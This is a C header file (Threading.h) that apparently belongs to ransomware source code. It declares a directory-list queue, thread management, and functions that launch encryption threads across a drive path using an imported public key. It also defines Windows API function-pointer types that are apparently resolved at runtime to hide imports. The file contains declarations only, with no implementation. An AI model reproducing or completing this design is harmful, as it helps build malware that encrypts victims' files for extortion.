#pragma once

#ifndef __Threading_h__
#define __Threading_h__
#include "Crypto.h"
struct LL_NODE {
	LPSTR dirName;
	struct LL_NODE* nextNode;
};

typedef struct {
	HANDLE* threadArray;
	int threadCount;
	CRITICAL_SECTION threadCriticalSection;
	LL_NODE* head;
	LL_NODE* tail;
} THREAD_STRUCT;

extern THREAD_STRUCT threadStruct;


typedef int(WINAPI* MemelstrcmpA)(LPCSTR lpString1, LPCSTR lpString2);
typedef PCSTR(WINAPI* MemeStrStrIA)(PCSTR pszFirst, PCSTR pszSrch);
typedef HANDLE(WINAPI* MemeFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
typedef void(WINAPI* MemeEnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
typedef void(WINAPI* MemeLeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
typedef BOOL(WINAPI* MemeFindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI* MemeFindClose)(HANDLE hFindFile);
typedef BOOL(WINAPI* MemeCryptAcquireContextA)(HCRYPTPROV* phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL(WINAPI* MemeCryptImportKey)(HCRYPTPROV hProv, const BYTE* pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY* phKey);
typedef void(WINAPI* MemeGetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
typedef HANDLE(WINAPI* MemeCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD(WINAPI* MemeWaitForMultipleObjects)(DWORD nCount, const HANDLE* lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
typedef void(WINAPI* MemeDeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
typedef void(WINAPI* MemeExitThread)(DWORD dwExitCode);
typedef void(WINAPI* MemeInitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
typedef void(WINAPI* MemeSleep)(DWORD dwMilliseconds);

void threadEncrypt(THREAD_STRUCT* pThreadStruct);

int initThreadStruct();

void launchThreadEncrypt(LPSTR drivePath);

void cleanUpThread();

void freeNode(LL_NODE* node);

LL_NODE* popNode(THREAD_STRUCT* pThreadStruct);

int addNode(THREAD_STRUCT* pThreadStruct, LPSTR name);

LL_NODE* newNode();

int acquireContext(HCRYPTPROV* phCryptProv);

int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR directoryName, THREAD_STRUCT* pThreadStruct);
#endif
